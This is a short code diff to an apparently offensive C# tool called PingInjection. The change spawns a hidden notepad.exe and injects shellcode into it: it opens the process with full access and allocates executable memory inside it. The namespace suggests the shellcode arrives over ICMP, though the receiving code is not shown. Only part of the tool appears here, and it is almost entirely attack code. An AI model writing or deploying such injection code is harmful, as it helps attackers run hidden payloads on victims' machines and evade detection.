@@ -2,6 +2,9 @@ using System;
 using System.Net;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
+using System.Collections;
+using System.IO;
+using System.Diagnostics;
 
 namespace PingInjection
 {
@@ -18,7 +21,12 @@ namespace PingInjection
 
         public static void shellcodeInjection(byte[] shellcode)
         {
-            int notepadPID = 7972;
+            Process proc = new Process();
+
+            proc.StartInfo.FileName = "C:\\WINDOWS\\SYSTEM32\\NOTEPAD.EXE";
+            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            proc.Start();
+            int notepadPID = proc.Id;
             IntPtr hProcess = OpenProcess(0x001F0FFF, false, notepadPID);
             IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
             byte[] buf = shellcode;
